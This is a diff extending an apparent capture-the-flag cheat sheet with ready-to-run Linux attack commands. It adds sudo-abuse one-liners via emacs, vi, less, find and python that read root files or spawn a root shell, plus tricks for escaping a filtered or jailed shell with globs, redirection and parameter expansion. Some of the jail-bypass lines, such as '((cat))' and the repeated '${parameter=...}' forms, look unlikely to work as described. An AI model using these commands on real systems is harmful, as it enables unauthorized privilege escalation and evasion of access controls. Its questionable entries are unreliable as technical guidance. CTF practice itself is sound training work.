@@ -26,3 +26,33 @@ find / -perm -2000 -type f 2>/dev/null
 # Writable directories/files search
 find / -writable -type d 2>/dev/null
 find / -writable -type f 2>/dev/null
+
+# Sudo Abuse (GTFOBins) - run after sudo -l shows a NOPASSWD/loose grant
+# Emacs batch file read as root (prints file to stdout)
+sudo /bin/emacs --batch -q -eval '(princ (with-temp-buffer (insert-file-contents "/path/to/flag.txt") (buffer-string)))'
+# Emacs interactive -> root shell (M-x shell / M-x eshell)
+sudo /bin/emacs
+# Vim/less root file read
+sudo vi /path/to/flag.txt
+sudo less /path/to/flag.txt
+# find: command execution as root
+sudo find / -exec /bin/sh \; -quit
+# python: interactive root shell
+sudo python3 -c 'import pty; pty.spawn("/bin/sh")'
+
+# ============================================================================
+# Shell Jail / Filtered Shell Bypass
+# When a login shell autocorrects or bans PLAIN WORDS (ls->Is, cat->Cap) but
+# passes compound shell syntax through, wrap the real command in an opaque
+# construct the filter does not tokenize. Wildcards/redirection usually survive.
+# ============================================================================
+# Discover the hidden dir/file name without spelling a banned word
+*
+# Read flag: redirection (<) + glob (*) -> no banned word needed
+<1&cat blargh/*
+# Same via parameter-expansion default-value assignment (opaque to word filters)
+${parameter=ls}
+${parameter=ls blargh}
+${parameter=cat < blargh/flag.txt}
+# Same via command-grouping construct
+((cat)) < blargh/flag.txt
